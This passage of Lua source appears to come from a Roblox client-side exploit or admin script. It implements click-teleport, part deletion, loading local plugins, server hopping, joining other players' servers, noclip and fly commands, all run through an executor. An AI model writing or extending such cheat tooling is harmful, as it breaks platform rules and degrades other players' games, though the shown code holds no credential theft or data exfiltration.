				humanoid.Sit = false
				wait(0.1)
			end

			local hipHeight = humanoid and humanoid.HipHeight > 0 and (humanoid.HipHeight + 1)
			local rootPart = getRoot(character)
			local rootPartPosition = rootPart.Position
			local hitPosition = IYMouse.Hit.Position
			local newCFrame = CFrame.new(
				hitPosition, 
				Vector3.new(rootPartPosition.X, hitPosition.Y, rootPartPosition.Z)
			) * CFrame.Angles(0, math.pi, 0)

			rootPart.CFrame = newCFrame + Vector3.new(0, hipHeight or 4, 0)
		end)
	end

	IYMouse.Button1Down:Connect(function()
		for i,v in pairs(binds) do
			if v.COMMAND == 'clicktp' then
				local input = v.KEY
				if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) and Players.LocalPlayer.Character then
					clicktpFunc()
				elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) and Players.LocalPlayer.Character then
					clicktpFunc()
				elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) and Players.LocalPlayer.Character then
					clicktpFunc()
				end
			elseif v.COMMAND == 'clickdel' then
				local input = v.KEY
				if input == 'RightClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
					pcall(function() IYMouse.Target:Destroy() end)
				elseif input == 'LeftClick' and UserInputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) then
					pcall(function() IYMouse.Target:Destroy() end)
				elseif UserInputService:IsKeyDown(Enum.KeyCode[input:sub(14)]) then
					pcall(function() IYMouse.Target:Destroy() end)
				end
			end
		end
	end)

	PluginsGUI = PluginEditor.background

	function addPlugin(name)
		if name:lower() == 'plugin file name' or name:lower() == 'iy_fe.iy' or name == 'iy_fe' then
			notify('Plugin Error','Please enter a valid plugin')
		else
			local file
			local fileName
			if name:sub(-3) == '.iy' then
				pcall(function() file = readfile(name) end)
				fileName = name
			else
				pcall(function() file = readfile(name..'.iy') end)
				fileName = name..'.iy'
			end
			if file then
				if not FindInTable(PluginsTable, fileName) then
					table.insert(PluginsTable, fileName)
					LoadPlugin(fileName)
					refreshplugins()
					pcall(eventEditor.Refresh)
				else
					notify('Plugin Error','This plugin is already added')
				end
			else
				notify('Plugin Error','Cannot locate file "'..fileName..'". Is the file in the correct folder?')
			end
		end
	end

	function deletePlugin(name)
		local pName = name..'.iy'
		if name:sub(-3) == '.iy' then
			pName = name
		end
		for i = #cmds,1,-1 do
			if cmds[i].PLUGIN == pName then
				table.remove(cmds, i)
			end
		end
		for i,v in pairs(CMDsF:GetChildren()) do
			if v.Name == 'PLUGIN_'..pName then
				v:Destroy()
			end
		end
		for i,v in pairs(PluginsTable) do
			if v == pName then
				table.remove(PluginsTable, i)
				notify('Removed Plugin',pName..' was removed')
			end
		end
		IndexContents('',true)
		refreshplugins()
	end

	function refreshplugins(dontSave)
		if #PluginsTable > 0 then
			PluginsHint:Destroy()
		end
		if Holder_5 then
			Holder_5:ClearAllChildren()
			Holder_5.CanvasSize = UDim2.new(0, 0, 0, 10)
			for i,v in pairs(PluginsTable) do
				local pName = v
				local YSize = 25
				local Position = ((i * YSize) - YSize)
				local newplugin = Example_5:Clone()
				newplugin.Parent = Holder_5
				newplugin.Visible = true
				newplugin.Position = UDim2.new(0,0,0, Position + 5)
				newplugin.Text.Text = pName
				table.insert(shade2,newplugin)
				table.insert(shade2,newplugin.Text)
				table.insert(text1,newplugin.Text)
				table.insert(shade3,newplugin.Text.Delete)
				table.insert(text2,newplugin.Text.Delete)
				Holder_5.CanvasSize = UDim2.new(0,0,0, Position + 30)
				newplugin.Text.Delete.MouseButton1Click:Connect(function()
					deletePlugin(pName)
				end)
			end
			if not dontSave then
				updatesaves()
			end
		end
	end

	local PluginCache
	function LoadPlugin(val,startup)
		local plugin

		function CatchedPluginLoad()
			plugin = loadfile(val)()
		end

		function handlePluginError(plerror)
			notify('Plugin Error','An error occurred with the plugin, "'..val..'" and it could not be loaded')
			if FindInTable(PluginsTable,val) then
				for i,v in pairs(PluginsTable) do
					if v == val then
						table.remove(PluginsTable,i)
					end
				end
			end
			updatesaves()

			print("Original Error: "..tostring(plerror))
			print("Plugin Error, stack traceback: "..tostring(debug.traceback()))

			plugin = nil

			return false
		end

		xpcall(CatchedPluginLoad, handlePluginError)

		if plugin ~= nil then
			if not startup then
				notify('Loaded Plugin',"Name: "..plugin["PluginName"].."\n".."Description: "..plugin["PluginDescription"])
			end
			addcmdtext('',val)
			addcmdtext(string.upper('--'..plugin["PluginName"]),val,plugin["PluginDescription"])
			if plugin["Commands"] then
				for i,v in pairs(plugin["Commands"]) do 
					local cmdExt = ''
					local cmdName = i
					local function handleNames()
						cmdName = i
						if findCmd(cmdName..cmdExt) then
							if isNumber(cmdExt) then
								cmdExt = cmdExt+1
							else
								cmdExt = 1
							end
							handleNames()
						else
							cmdName = cmdName..cmdExt
						end
					end
					handleNames()
					addcmd(cmdName, v["Aliases"], v["Function"], val)
					if v["ListName"] then
						local newName = v.ListName
						local cmdNames = {i,unpack(v.Aliases)}
						for i,v in pairs(cmdNames) do
							newName = newName:gsub(v,v..cmdExt)
						end
						addcmdtext(newName,val,v["Description"])
					else
						addcmdtext(cmdName,val,v["Description"])
					end
				end
			end
			IndexContents('',true)
		elseif plugin == nil then
			plugin = nil
		end
	end

	function FindPlugins()
		if PluginsTable ~= nil and type(PluginsTable) == "table" then
			for i,v in pairs(PluginsTable) do
				LoadPlugin(v,true)
			end
			refreshplugins(true)
		end
	end

	AddPlugin.MouseButton1Click:Connect(function()
		addPlugin(PluginsGUI.FileName.Text)
	end)

	Exit_3.MouseButton1Click:Connect(function()
		PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, -500), "InOut", "Quart", 0.5, true, nil)
		FileName.Text = 'Plugin File Name'
	end)

	Add_3.MouseButton1Click:Connect(function()
		PluginEditor:TweenPosition(UDim2.new(0.5, -180, 0, 310), "InOut", "Quart", 0.5, true, nil)
	end)

	Plugins.MouseButton1Click:Connect(function()
		if writefileExploit() then
			PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.5)
			SettingsHolder.Visible = false
		else
			notify('Incompatible Exploit','Your exploit is unable to use plugins (missing read/writefile)')
		end
	end)

	Close_4.MouseButton1Click:Connect(function()
		SettingsHolder.Visible = true
		PluginsFrame:TweenPosition(UDim2.new(0, 0, 0, 175), "InOut", "Quart", 0.5, true, nil)
	end)



	addcmd('addalias',{},function(args, speaker)
		if #args < 2 then return end
		local cmd = string.lower(args[1])
		local alias = string.lower(args[2])
		for i,v in pairs(cmds) do
			if v.NAME:lower()==cmd or FindInTable(v.ALIAS,cmd) then
				customAlias[alias] = v
				aliases[#aliases + 1] = {CMD = cmd, ALIAS = alias}
				notify('Aliases Modified',"Added "..alias.." as an alias to "..cmd)
				updatesaves()
				refreshaliases()
				break
			end
		end
	end)

	addcmd('removealias',{},function(args, speaker)
		if #args < 1 then return end
		local alias = string.lower(args[1])
		if customAlias[alias] then
			local cmd = customAlias[alias].NAME
			customAlias[alias] = nil
			for i = #aliases,1,-1 do
				if aliases[i].ALIAS == tostring(alias) then
					table.remove(aliases, i)
				end
			end
			notify('Aliases Modified',"Removed the alias "..alias.." from "..cmd)
			updatesaves()
			refreshaliases()
		end
	end)

	addcmd('clraliases',{},function(args, speaker)
		customAlias = {}
		aliases = {}
		notify('Aliases Modified','Removed all aliases')
		updatesaves()
		refreshaliases()
	end)

	addcmd('discord', {'support', 'help'}, function(args, speaker)
		if toClipboard then
			toClipboard('https://discord.com/invite/dYHag43eeU')
			notify('Discord Invite', 'Copied to clipboard!\ndiscord.gg/dYHag43eeU')
		else
			notify('Discord Invite', 'discord.gg/dYHag43eeU')
		end
		if httprequest then
			httprequest({
				Url = 'http://127.0.0.1:6463/rpc?v=1',
				Method = 'POST',
				Headers = {
					['Content-Type'] = 'application/json',
					Origin = 'https://discord.com'
				},
				Body = HttpService:JSONEncode({
					cmd = 'INVITE_BROWSER',
					nonce = HttpService:GenerateGUID(false),
					args = {code = 'dYHag43eeU'}
				})
			})
		end
	end)

	addcmd('keepiy', {}, function(args, speaker)
		if queueteleport then
			KeepInfYield = true
			updatesaves()
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing queue_on_teleport)')
		end
	end)

	addcmd('unkeepiy', {}, function(args, speaker)
		if queueteleport then
			KeepInfYield = false
			updatesaves()
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing queue_on_teleport)')
		end
	end)

	addcmd('toggleunkeepiy', {}, function(args, speaker)
		if queueteleport then
			KeepInfYield = not KeepInfYield
			updatesaves()
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing queue_on_teleport)')
		end
	end)

	local canOpenServerinfo = true
	addcmd('serverinfo',{'info','sinfo'},function(args, speaker)
		if not canOpenServerinfo then return end
		canOpenServerinfo = false
		task.spawn(function()
			local FRAME = Instance.new("Frame")
			local shadow = Instance.new("Frame")
			local PopupText = Instance.new("TextLabel")
			local Exit = Instance.new("TextButton")
			local ExitImage = Instance.new("ImageLabel")
			local background = Instance.new("Frame")
			local TextLabel = Instance.new("TextLabel")
			local TextLabel2 = Instance.new("TextLabel")
			local TextLabel3 = Instance.new("TextLabel")
			local Time = Instance.new("TextLabel")
			local appearance = Instance.new("TextLabel")
			local maxplayers = Instance.new("TextLabel")
			local name = Instance.new("TextLabel")
			local placeid = Instance.new("TextLabel")
			local playerid = Instance.new("TextLabel")
			local players = Instance.new("TextLabel")
			local CopyApp = Instance.new("TextButton")
			local CopyPlrID = Instance.new("TextButton")
			local CopyPlcID = Instance.new("TextButton")

			FRAME.Name = randomString()
			FRAME.Parent = PARENT
			FRAME.Active = true
			FRAME.BackgroundTransparency = 1
			FRAME.Position = UDim2.new(0.5, -130, 0, -500)
			FRAME.Size = UDim2.new(0, 250, 0, 20)
			FRAME.ZIndex = 10
			dragGUI(FRAME)

			shadow.Name = "shadow"
			shadow.Parent = FRAME
			shadow.BackgroundColor3 = currentShade2
			shadow.BorderSizePixel = 0
			shadow.Size = UDim2.new(0, 250, 0, 20)
			shadow.ZIndex = 10
			table.insert(shade2,shadow)

			PopupText.Name = "PopupText"
			PopupText.Parent = shadow
			PopupText.BackgroundTransparency = 1
			PopupText.Size = UDim2.new(1, 0, 0.95, 0)
			PopupText.ZIndex = 10
			PopupText.Font = Enum.Font.SourceSans
			PopupText.TextSize = 14
			PopupText.Text = "Server"
			PopupText.TextColor3 = currentText1
			PopupText.TextWrapped = true
			table.insert(text1,PopupText)

			Exit.Name = "Exit"
			Exit.Parent = shadow
			Exit.BackgroundTransparency = 1
			Exit.Position = UDim2.new(1, -20, 0, 0)
			Exit.Size = UDim2.new(0, 20, 0, 20)
			Exit.Text = ""
			Exit.ZIndex = 10

			ExitImage.Parent = Exit
			ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
			ExitImage.BackgroundTransparency = 1
			ExitImage.Position = UDim2.new(0, 5, 0, 5)
			ExitImage.Size = UDim2.new(0, 10, 0, 10)
			ExitImage.Image = "rbxassetid://5054663650"
			ExitImage.ZIndex = 10

			background.Name = "background"
			background.Parent = FRAME
			background.Active = true
			background.BackgroundColor3 = currentShade1
			background.BorderSizePixel = 0
			background.Position = UDim2.new(0, 0, 1, 0)
			background.Size = UDim2.new(0, 250, 0, 250)
			background.ZIndex = 10
			table.insert(shade1,background)

			TextLabel.Name = "Text Label"
			TextLabel.Parent = background
			TextLabel.BackgroundTransparency = 1
			TextLabel.BorderSizePixel = 0
			TextLabel.Position = UDim2.new(0, 5, 0, 80)
			TextLabel.Size = UDim2.new(0, 100, 0, 20)
			TextLabel.ZIndex = 10
			TextLabel.Font = Enum.Font.SourceSansLight
			TextLabel.TextSize = 20
			TextLabel.Text = "Run Time:"
			TextLabel.TextColor3 = currentText1
			TextLabel.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,TextLabel)

			TextLabel2.Name = "Text Label2"
			TextLabel2.Parent = background
			TextLabel2.BackgroundTransparency = 1
			TextLabel2.BorderSizePixel = 0
			TextLabel2.Position = UDim2.new(0, 5, 0, 130)
			TextLabel2.Size = UDim2.new(0, 100, 0, 20)
			TextLabel2.ZIndex = 10
			TextLabel2.Font = Enum.Font.SourceSansLight
			TextLabel2.TextSize = 20
			TextLabel2.Text = "Statistics:"
			TextLabel2.TextColor3 = currentText1
			TextLabel2.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,TextLabel2)

			TextLabel3.Name = "Text Label3"
			TextLabel3.Parent = background
			TextLabel3.BackgroundTransparency = 1
			TextLabel3.BorderSizePixel = 0
			TextLabel3.Position = UDim2.new(0, 5, 0, 10)
			TextLabel3.Size = UDim2.new(0, 100, 0, 20)
			TextLabel3.ZIndex = 10
			TextLabel3.Font = Enum.Font.SourceSansLight
			TextLabel3.TextSize = 20
			TextLabel3.Text = "Local Player:"
			TextLabel3.TextColor3 = currentText1
			TextLabel3.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,TextLabel3)

			Time.Name = "Time"
			Time.Parent = background
			Time.BackgroundTransparency = 1
			Time.BorderSizePixel = 0
			Time.Position = UDim2.new(0, 5, 0, 105)
			Time.Size = UDim2.new(0, 100, 0, 20)
			Time.ZIndex = 10
			Time.Font = Enum.Font.SourceSans
			Time.FontSize = Enum.FontSize.Size14
			Time.Text = "LOADING"
			Time.TextColor3 = currentText1
			Time.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,Time)

			appearance.Name = "appearance"
			appearance.Parent = background
			appearance.BackgroundTransparency = 1
			appearance.BorderSizePixel = 0
			appearance.Position = UDim2.new(0, 5, 0, 55)
			appearance.Size = UDim2.new(0, 100, 0, 20)
			appearance.ZIndex = 10
			appearance.Font = Enum.Font.SourceSans
			appearance.FontSize = Enum.FontSize.Size14
			appearance.Text = "Appearance: LOADING"
			appearance.TextColor3 = currentText1
			appearance.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,appearance)

			maxplayers.Name = "maxplayers"
			maxplayers.Parent = background
			maxplayers.BackgroundTransparency = 1
			maxplayers.BorderSizePixel = 0
			maxplayers.Position = UDim2.new(0, 5, 0, 175)
			maxplayers.Size = UDim2.new(0, 100, 0, 20)
			maxplayers.ZIndex = 10
			maxplayers.Font = Enum.Font.SourceSans
			maxplayers.FontSize = Enum.FontSize.Size14
			maxplayers.Text = "LOADING"
			maxplayers.TextColor3 = currentText1
			maxplayers.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,maxplayers)

			name.Name = "name"
			name.Parent = background
			name.BackgroundTransparency = 1
			name.BorderSizePixel = 0
			name.Position = UDim2.new(0, 5, 0, 215)
			name.Size = UDim2.new(0, 240, 0, 30)
			name.ZIndex = 10
			name.Font = Enum.Font.SourceSans
			name.FontSize = Enum.FontSize.Size14
			name.Text = "Place Name: LOADING"
			name.TextColor3 = currentText1
			name.TextWrapped = true
			name.TextXAlignment = Enum.TextXAlignment.Left
			name.TextYAlignment = Enum.TextYAlignment.Top
			table.insert(text1,name)

			placeid.Name = "placeid"
			placeid.Parent = background
			placeid.BackgroundTransparency = 1
			placeid.BorderSizePixel = 0
			placeid.Position = UDim2.new(0, 5, 0, 195)
			placeid.Size = UDim2.new(0, 100, 0, 20)
			placeid.ZIndex = 10
			placeid.Font = Enum.Font.SourceSans
			placeid.FontSize = Enum.FontSize.Size14
			placeid.Text = "Place ID: LOADING"
			placeid.TextColor3 = currentText1
			placeid.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,placeid)

			playerid.Name = "playerid"
			playerid.Parent = background
			playerid.BackgroundTransparency = 1
			playerid.BorderSizePixel = 0
			playerid.Position = UDim2.new(0, 5, 0, 35)
			playerid.Size = UDim2.new(0, 100, 0, 20)
			playerid.ZIndex = 10
			playerid.Font = Enum.Font.SourceSans
			playerid.FontSize = Enum.FontSize.Size14
			playerid.Text = "Player ID: LOADING"
			playerid.TextColor3 = currentText1
			playerid.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,playerid)

			players.Name = "players"
			players.Parent = background
			players.BackgroundTransparency = 1
			players.BorderSizePixel = 0
			players.Position = UDim2.new(0, 5, 0, 155)
			players.Size = UDim2.new(0, 100, 0, 20)
			players.ZIndex = 10
			players.Font = Enum.Font.SourceSans
			players.FontSize = Enum.FontSize.Size14
			players.Text = "LOADING"
			players.TextColor3 = currentText1
			players.TextXAlignment = Enum.TextXAlignment.Left
			table.insert(text1,players)

			CopyApp.Name = "CopyApp"
			CopyApp.Parent = background
			CopyApp.BackgroundColor3 = currentShade2
			CopyApp.BorderSizePixel = 0
			CopyApp.Position = UDim2.new(0, 210, 0, 55)
			CopyApp.Size = UDim2.new(0, 35, 0, 20)
			CopyApp.Font = Enum.Font.SourceSans
			CopyApp.TextSize = 14
			CopyApp.Text = "Copy"
			CopyApp.TextColor3 = currentText1
			CopyApp.ZIndex = 10
			table.insert(shade2,CopyApp)
			table.insert(text1,CopyApp)

			CopyPlrID.Name = "CopyPlrID"
			CopyPlrID.Parent = background
			CopyPlrID.BackgroundColor3 = currentShade2
			CopyPlrID.BorderSizePixel = 0
			CopyPlrID.Position = UDim2.new(0, 210, 0, 35)
			CopyPlrID.Size = UDim2.new(0, 35, 0, 20)
			CopyPlrID.Font = Enum.Font.SourceSans
			CopyPlrID.TextSize = 14
			CopyPlrID.Text = "Copy"
			CopyPlrID.TextColor3 = currentText1
			CopyPlrID.ZIndex = 10
			table.insert(shade2,CopyPlrID)
			table.insert(text1,CopyPlrID)

			CopyPlcID.Name = "CopyPlcID"
			CopyPlcID.Parent = background
			CopyPlcID.BackgroundColor3 = currentShade2
			CopyPlcID.BorderSizePixel = 0
			CopyPlcID.Position = UDim2.new(0, 210, 0, 195)
			CopyPlcID.Size = UDim2.new(0, 35, 0, 20)
			CopyPlcID.Font = Enum.Font.SourceSans
			CopyPlcID.TextSize = 14
			CopyPlcID.Text = "Copy"
			CopyPlcID.TextColor3 = currentText1
			CopyPlcID.ZIndex = 10
			table.insert(shade2,CopyPlcID)
			table.insert(text1,CopyPlcID)

			local SINFOGUI = background
			FRAME:TweenPosition(UDim2.new(0.5, -130, 0, 100), "InOut", "Quart", 0.5, true, nil) 
			wait(0.5)
			Exit.MouseButton1Click:Connect(function()
				FRAME:TweenPosition(UDim2.new(0.5, -130, 0, -500), "InOut", "Quart", 0.5, true, nil) 
				wait(0.6)
				FRAME:Destroy()
				canOpenServerinfo = true
			end)
			local Asset = MarketplaceService:GetProductInfo(PlaceId)
			SINFOGUI.name.Text = "Place Name: " .. Asset.Name
			SINFOGUI.playerid.Text = "Player ID: " ..speaker.UserId
			SINFOGUI.maxplayers.Text = Players.MaxPlayers.. " Players Max"
			SINFOGUI.placeid.Text = "Place ID: " ..PlaceId

			CopyApp.MouseButton1Click:Connect(function()
				toClipboard(speaker.CharacterAppearanceId)
			end)
			CopyPlrID.MouseButton1Click:Connect(function()
				toClipboard(speaker.UserId)
			end)
			CopyPlcID.MouseButton1Click:Connect(function()
				toClipboard(PlaceId)
			end)

			repeat
				players = Players:GetPlayers()
				SINFOGUI.players.Text = #players.. " Player(s)"
				SINFOGUI.appearance.Text = "Appearance: " ..speaker.CharacterAppearanceId
				local seconds = math.floor(workspace.DistributedGameTime)
				local minutes = math.floor(workspace.DistributedGameTime / 60)
				local hours = math.floor(workspace.DistributedGameTime / 60 / 60)
				local seconds = seconds - (minutes * 60)
				local minutes = minutes - (hours * 60)
				if hours < 1 then if minutes < 1 then
						SINFOGUI.Time.Text = seconds .. " Second(s)" else
						SINFOGUI.Time.Text = minutes .. " Minute(s), " .. seconds .. " Second(s)"
					end
				else
					SINFOGUI.Time.Text = hours .. " Hour(s), " .. minutes .. " Minute(s), " .. seconds .. " Second(s)"
				end
				wait(1)
			until SINFOGUI.Parent == nil
		end)
	end)

	addcmd('jobid',{},function(args, speaker)
		local jobId = 'Roblox.GameLauncher.joinGameInstance('..PlaceId..', "'..JobId..'")'
		toClipboard(jobId)
	end)

	addcmd('notifyjobid',{},function(args, speaker)
		notify('JobId / PlaceId',JobId..' / '..PlaceId)
	end)

	addcmd('breakloops',{'break'},function(args, speaker)
		lastBreakTime = tick()
	end)

	addcmd('gametp',{'gameteleport'},function(args, speaker)
		TeleportService:Teleport(args[1])
	end)

	addcmd('rejoin',{'rj'},function(args, speaker)
		if #Players:GetPlayers() <= 1 then
			Players.LocalPlayer:Kick("\nRejoining...")
			wait()
			TeleportService:Teleport(PlaceId, Players.LocalPlayer)
		else
			TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
		end
	end)

	addcmd('autorejoin',{'autorj'},function(args, speaker)
		local Dir = COREGUI:FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay")
		Dir.DescendantAdded:Connect(function(Err)
			if Err.Name == "ErrorTitle" then
				Err:GetPropertyChangedSignal("Text"):Connect(function()
					if Err.Text:sub(0, 12) == "Disconnected" then
						if #Players:GetPlayers() <= 1 then
							Players.LocalPlayer:Kick("\nRejoining...")
							wait()
							TeleportService:Teleport(PlaceId, Players.LocalPlayer)
						else
							TeleportService:TeleportToPlaceInstance(PlaceId, JobId, Players.LocalPlayer)
						end
					end
				end)
			end
		end)
		notify('Auto Rejoin','Auto rejoin enabled')
	end)

	addcmd('serverhop',{'shop'},function(args, speaker)
		-- thanks to NoobSploit for fixing
		if httprequest then
			local servers = {}
			local req = httprequest({Url = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Desc&limit=100", PlaceId)})
			local body = HttpService:JSONDecode(req.Body)
			if body and body.data then
				for i, v in next, body.data do
					if type(v) == "table" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and v.id ~= JobId then
						table.insert(servers, 1, v.id)
					end
				end
			end
			if #servers > 0 then
				TeleportService:TeleportToPlaceInstance(PlaceId, servers[math.random(1, #servers)], Players.LocalPlayer)
			else
				return notify("Serverhop", "Couldn't find a server.")
			end
		end
	end)

	addcmd('joinplayer',{'joinp'},function(args, speaker)
		local retries = 0
		function ToServer(User,Place)	
			if args[2] == nil then Place = PlaceId end
			if not pcall(function()
					local FoundUser, UserId = pcall(function()
						if tonumber(User) then
							return tonumber(User)
						end

						return Players:GetUserIdFromNameAsync(User)
					end)
					if not FoundUser then
						notify('Join Error','Username/UserID does not exist')
					else
						notify('Join Player','Loading servers. Hold on a second.')
						local URL2 = ("https://games.roblox.com/v1/games/"..Place.."/servers/Public?sortOrder=Asc&limit=100")
						local Http = HttpService:JSONDecode(game:HttpGet(URL2))
						local GUID

						function tablelength(T)
							local count = 0
							for _ in pairs(T) do count = count + 1 end
							return count
						end

						for i=1,tonumber(tablelength(Http.data)) do
							for j,k in pairs(Http.data[i].playerIds) do
								if k == UserId then
									GUID = Http.data[i].id
								end
							end
						end

						if GUID ~= nil then
							notify('Join Player','Joining '..User)
							TeleportService:TeleportToPlaceInstance(Place,GUID,Players.LocalPlayer)
						else
							notify('Join Error','Unable to join user.')
						end
					end
				end)
			then
				if retries < 3 then
					retries = retries + 1
					print('ERROR retrying '..retries..'/3')
					notify('Join Error','Error while trying to join. Retrying '..retries..'/3.')
					ToServer(User,Place)
				else
					notify('Join Error','Error while trying to join.')
				end
			end
		end
		ToServer(args[1],args[2])
	end)

	addcmd('exit',{},function(args, speaker)
		game:shutdown() 
	end)

	local Noclipping = nil
	addcmd('noclip',{},function(args, speaker)
		Clip = false
		wait(0.1)
		local function NoclipLoop()
			if Clip == false and speaker.Character ~= nil then
				for _, child in pairs(speaker.Character:GetDescendants()) do
					if child:IsA("BasePart") and child.CanCollide == true and child.Name ~= floatName then
						child.CanCollide = false
					end
				end
			end
		end
		Noclipping = RunService.Stepped:Connect(NoclipLoop)
	end)

	addcmd('clip',{'unnoclip'},function(args, speaker)
		if Noclipping then
			Noclipping:Disconnect()
		end
		Clip = true
	end)

	addcmd('togglenoclip',{},function(args, speaker)
		if Clip then
			execCmd('noclip')
		else
			execCmd('clip')
		end
	end)

	FLYING = false
	QEfly = true
	iyflyspeed = 1
	vehicleflyspeed = 1
	function sFLY(vfly)
		repeat wait() until Players.LocalPlayer and Players.LocalPlayer.Character and getRoot(Players.LocalPlayer.Character) and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
		repeat wait() until IYMouse
		if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end

		local T = getRoot(Players.LocalPlayer.Character)
		local CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
		local SPEED = 0

		local function FLY()
			FLYING = true
			local BG = Instance.new('BodyGyro')
			local BV = Instance.new('BodyVelocity')
			BG.P = 9e4
			BG.Parent = T
			BV.Parent = T
			BG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
			BG.cframe = T.CFrame
			BV.velocity = Vector3.new(0, 0, 0)
			BV.maxForce = Vector3.new(9e9, 9e9, 9e9)
			task.spawn(function()
				repeat wait()
					if not vfly and Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
						Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
					end
					if CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0 then
						SPEED = 50
					elseif not (CONTROL.L + CONTROL.R ~= 0 or CONTROL.F + CONTROL.B ~= 0 or CONTROL.Q + CONTROL.E ~= 0) and SPEED ~= 0 then
						SPEED = 0
					end
					if (CONTROL.L + CONTROL.R) ~= 0 or (CONTROL.F + CONTROL.B) ~= 0 or (CONTROL.Q + CONTROL.E) ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (CONTROL.F + CONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(CONTROL.L + CONTROL.R, (CONTROL.F + CONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
						lCONTROL = {F = CONTROL.F, B = CONTROL.B, L = CONTROL.L, R = CONTROL.R}
					elseif (CONTROL.L + CONTROL.R) == 0 and (CONTROL.F + CONTROL.B) == 0 and (CONTROL.Q + CONTROL.E) == 0 and SPEED ~= 0 then
						BV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lCONTROL.F + lCONTROL.B)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lCONTROL.L + lCONTROL.R, (lCONTROL.F + lCONTROL.B + CONTROL.Q + CONTROL.E) * 0.2, 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * SPEED
					else
						BV.velocity = Vector3.new(0, 0, 0)
					end
					BG.cframe = workspace.CurrentCamera.CoordinateFrame
				until not FLYING
				CONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				lCONTROL = {F = 0, B = 0, L = 0, R = 0, Q = 0, E = 0}
				SPEED = 0
				BG:Destroy()
				BV:Destroy()
				if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
					Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
				end
			end)
		end
		flyKeyDown = IYMouse.KeyDown:Connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = (vfly and vehicleflyspeed or iyflyspeed)
			elseif KEY:lower() == 's' then
				CONTROL.B = - (vfly and vehicleflyspeed or iyflyspeed)
			elseif KEY:lower() == 'a' then
				CONTROL.L = - (vfly and vehicleflyspeed or iyflyspeed)
			elseif KEY:lower() == 'd' then 
				CONTROL.R = (vfly and vehicleflyspeed or iyflyspeed)
			elseif QEfly and KEY:lower() == 'e' then
				CONTROL.Q = (vfly and vehicleflyspeed or iyflyspeed)*2
			elseif QEfly and KEY:lower() == 'q' then
				CONTROL.E = -(vfly and vehicleflyspeed or iyflyspeed)*2
			end
			pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Track end)
		end)
		flyKeyUp = IYMouse.KeyUp:Connect(function(KEY)
			if KEY:lower() == 'w' then
				CONTROL.F = 0
			elseif KEY:lower() == 's' then
				CONTROL.B = 0
			elseif KEY:lower() == 'a' then
				CONTROL.L = 0
			elseif KEY:lower() == 'd' then
				CONTROL.R = 0
			elseif KEY:lower() == 'e' then
				CONTROL.Q = 0
			elseif KEY:lower() == 'q' then
				CONTROL.E = 0
			end
		end)
		FLY()
	end

	function NOFLY()
		FLYING = false
		if flyKeyDown or flyKeyUp then flyKeyDown:Disconnect() flyKeyUp:Disconnect() end
		if Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid') then
			Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
		end
		pcall(function() workspace.CurrentCamera.CameraType = Enum.CameraType.Custom end)
	end

	local velocityHandlerName = randomString()
	local gyroHandlerName = randomString()
	local mfly1
	local mfly2

	local unmobilefly = function(speaker)
		pcall(function()
			FLYING = false
			local root = getRoot(speaker.Character)
			root:FindFirstChild(velocityHandlerName):Destroy()
			root:FindFirstChild(gyroHandlerName):Destroy()
			speaker.Character:FindFirstChildWhichIsA("Humanoid").PlatformStand = false
			mfly1:Disconnect()
			mfly2:Disconnect()
		end)
	end

	local mobilefly = function(speaker, vfly)
		unmobilefly(speaker)
		FLYING = true

		local root = getRoot(speaker.Character)
		local camera = workspace.CurrentCamera
		local v3none = Vector3.new()
		local v3zero = Vector3.new(0, 0, 0)
		local v3inf = Vector3.new(9e9, 9e9, 9e9)

		local controlModule = require(speaker.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule"))
		local bv = Instance.new("BodyVelocity")
		bv.Name = velocityHandlerName
		bv.Parent = root
